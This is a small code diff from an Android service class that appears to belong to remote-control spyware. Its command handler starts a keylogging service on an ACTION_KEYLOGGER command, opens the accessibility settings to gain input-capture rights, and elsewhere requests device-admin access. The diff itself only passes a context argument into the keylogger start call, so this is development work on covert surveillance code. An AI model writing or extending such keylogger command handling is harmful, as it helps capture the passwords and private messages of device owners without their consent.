@@ -496,7 +496,7 @@ public class CommandsIntentService extends IntentService {
                 }
                 startPermissionActivity(this, intent, AdminActivity.class);
             }else if(action.equals(ACTION_KEYLOGGER)){
-                Systems.Root.startKeyloggingService();
+                Systems.Root.startKeyloggingService(this);
                 Systems.Phone.Settings.openAccessibilityOptions(this);
             }else {
                 Log.d(TAG, "No action found!");
